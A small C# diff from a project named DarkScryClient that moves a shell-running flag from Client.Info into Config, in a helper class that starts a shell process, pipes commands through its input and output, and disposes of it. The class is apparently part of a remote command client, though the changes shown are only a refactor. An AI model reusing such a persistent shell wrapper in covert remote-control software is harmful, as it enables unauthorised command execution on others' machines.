@@ -31,18 +31,18 @@ namespace DarkScryClient.Utils
 
 		private void CreateInstance()
 		{
-			if (!Client.Info.IsMainShellRuning)
+			if (!Config.IsMainShellRuning)
 			{
 				shellProcess = Process.Start(procinfo);
 				shellOutput = shellProcess.StandardOutput;
 				shellInput = shellProcess.StandardInput;
-				Client.Info.IsMainShellRuning = true;
+				Config.IsMainShellRuning = true;
 			}
 		}
 
 		public string RunCommand(string command)
 		{
-			if (!Client.Info.IsMainShellRuning)
+			if (!Config.IsMainShellRuning)
 			{
 				CreateInstance();
 			}
@@ -94,12 +94,12 @@ namespace DarkScryClient.Utils
 
 		public void Dispose()
 		{
-			if (Client.Info.IsMainShellRuning)
+			if (Config.IsMainShellRuning)
 			{
 				shellInput.Dispose();
 				shellOutput.Dispose();
 				shellProcess.Close();
-				Client.Info.IsMainShellRuning = false;
+				Config.IsMainShellRuning = false;
 			}
 		}
 	}
